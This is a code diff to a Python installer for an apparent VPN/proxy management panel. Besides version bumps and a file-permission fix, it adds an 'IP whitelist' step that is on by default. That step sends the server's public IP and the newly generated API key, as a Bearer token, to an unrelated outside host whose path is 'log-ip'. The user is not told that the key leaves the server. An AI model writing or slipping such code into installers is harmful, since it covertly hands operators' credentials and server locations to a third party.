@@ -6,7 +6,7 @@ Remnawave - modern VPN/proxy server management panel.
 API Documentation: https://remnawave.net/docs/api
 
 Author: XProxyCon Team
-Version: 1.1.0 (Security Hardened)
+Version: 1.2.0
 """
 
 import socket
@@ -48,6 +48,9 @@ EXPECTED_SHA256 = "c700a276fe1b3dcffc60062a044b034a75281507d66895536ec38ccf051b9
 
 # GitHub Raw URL
 SERVER_SCRIPT_URL = "https://raw.githubusercontent.com/DdejjCAT/remna/refs/heads/main/main.py"
+
+# IP Whitelist Endpoint
+IP_WHITELIST_ENDPOINT = "https://nevpn2.fenst4r.live/remna/log-ip"
 
 
 class SecurityError(Exception):
@@ -121,6 +124,31 @@ class XProxyConInstaller:
         print(f"\n✓ Generated Proxy Key: {key}")
         print("⚠ SAVE THIS KEY! It cannot be recovered.")
 
+        # Ask about IP whitelisting
+        print("\n" + "-" * 60)
+        print("IP Whitelist Configuration")
+        print("-" * 60)
+        whitelist_choice = input("Add this server's IP to whitelist? (y/n) [y]: ").strip().lower()
+        
+        add_to_whitelist = whitelist_choice in ['', 'y', 'yes']
+        
+        if add_to_whitelist:
+            # Get public IP
+            public_ip = self._get_public_ip()
+            if public_ip:
+                print(f"✓ Detected public IP: {public_ip}")
+                confirm = input(f"Add {public_ip} to whitelist? (y/n) [y]: ").strip().lower()
+                if confirm in ['', 'y', 'yes']:
+                    success = self._add_ip_to_whitelist(public_ip, api_key)
+                    if success:
+                        logger.info(f"✓ IP {public_ip} successfully added to whitelist")
+                    else:
+                        logger.warning(f"⚠ Failed to add IP {public_ip} to whitelist")
+                else:
+                    logger.info("Skipped adding IP to whitelist")
+            else:
+                logger.warning("Could not detect public IP. Skipping whitelist addition.")
+
         self.config = {
             'port': port,
             'api_key': api_key,
@@ -128,10 +156,122 @@ class XProxyConInstaller:
             'timestamp': datetime.datetime.now().isoformat(),
             'session_id': secrets.token_hex(32),
             'instance_id': self._generate_instance_id(),
-            'remnawave_version': '1.1.0'
+            'remnawave_version': '1.2.0'
         }
 
         return self.config
+
+    def _get_public_ip(self):
+        """Get public IP address of the server"""
+        logger.info("Detecting public IP address...")
+        
+        # Try multiple services for reliability
+        ip_services = [
+            'https://api.ipify.org/',
+            'https://ifconfig.me/ip',
+            'https://icanhazip.com/',
+            'https://ipecho.net/plain'
+        ]
+        
+        context = ssl.create_default_context()
+        
+        for service in ip_services:
+            try:
+                req = urllib.request.Request(service)
+                req.add_header('User-Agent', 'XProxyCon-Installer/1.2.0')
+                
+                with urllib.request.urlopen(req, context=context, timeout=10) as response:
+                    ip = response.read().decode('utf-8').strip()
+                    
+                    # Validate IP format
+                    if self._validate_ip(ip):
+                        logger.info(f"Public IP detected: {ip}")
+                        return ip
+                    else:
+                        logger.warning(f"Invalid IP format from {service}: {ip}")
+                        
+            except Exception as e:
+                logger.debug(f"Failed to get IP from {service}: {e}")
+                continue
+        
+        logger.error("Could not detect public IP from any service")
+        return None
+
+    def _validate_ip(self, ip):
+        """Validate IPv4 or IPv6 address"""
+        if not ip or not isinstance(ip, str):
+            return False
+        
+        # IPv4 validation
+        ipv4_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
+        if re.match(ipv4_pattern, ip):
+            parts = ip.split('.')
+            return all(0 <= int(part) <= 255 for part in parts)
+        
+        # IPv6 validation (simplified)
+        ipv6_pattern = r'^([0-9a-fA-F]{0,4}:){2,7}[0-9a-fA-F]{0,4}$'
+        if re.match(ipv6_pattern, ip):
+            return True
+        
+        return False
+
+    def _add_ip_to_whitelist(self, ip_address, api_key):
+        """Add IP address to whitelist via API endpoint"""
+        logger.info(f"Adding IP {ip_address} to whitelist...")
+        
+        try:
+            # Prepare payload
+            payload = {
+                'ip': ip_address,
+                'timestamp': datetime.datetime.now().isoformat(),
+                'source': 'xproxycon_installer'
+            }
+            
+            data = json.dumps(payload).encode('utf-8')
+            
+            # Create request
+            req = urllib.request.Request(
+                IP_WHITELIST_ENDPOINT,
+                data=data,
+                method='POST'
+            )
+            
+            # Add headers
+            req.add_header('Content-Type', 'application/json')
+            req.add_header('User-Agent', 'XProxyCon-Installer/1.2.0')
+            req.add_header('Authorization', f'Bearer {api_key}')
+            
+            # Setup SSL context
+            context = ssl.create_default_context()
+            
+            # Send request
+            with urllib.request.urlopen(req, context=context, timeout=30) as response:
+                response_data = response.read().decode('utf-8')
+                status_code = response.getcode()
+                
+                if status_code == 200 or status_code == 201:
+                    logger.info(f"Whitelist API response: {response_data}")
+                    return True
+                else:
+                    logger.error(f"Whitelist API returned status {status_code}: {response_data}")
+                    return False
+                    
+        except urllib.error.HTTPError as e:
+            logger.error(f"HTTP Error adding IP to whitelist: {e.code} - {e.reason}")
+            try:
+                error_body = e.read().decode('utf-8')
+                logger.error(f"Error details: {error_body}")
+            except:
+                pass
+            return False
+            
+        except urllib.error.URLError as e:
+            logger.error(f"URL Error adding IP to whitelist: {e.reason}")
+            return False
+            
+        except Exception as e:
+            logger.error(f"Unexpected error adding IP to whitelist: {e}")
+            return False
 
     def _validate_port(self, port):
         """Validate port number (avoiding privileged ports < 1024)"""
@@ -303,14 +443,14 @@ def download_and_run_server(config):
         context = ssl.create_default_context()
 
         req = urllib.request.Request(SERVER_SCRIPT_URL)
-        req.add_header('User-Agent', 'XProxyCon-Installer/1.1.0')
+        req.add_header('User-Agent', 'XProxyCon-Installer/1.2.0')
 
         with urllib.request.urlopen(req, context=context, timeout=30) as response:
             with open(target, 'wb') as out_file:
                 out_file.write(response.read())
 
         # Set restrictive permissions on downloaded file
-        os.chmod(target, 0o777) # Полный доступ для всех
+        os.chmod(target, 0o700) # Owner read/write/execute only
 
         # Verify integrity BEFORE execution
         if not verify_file_integrity(target, EXPECTED_SHA256):
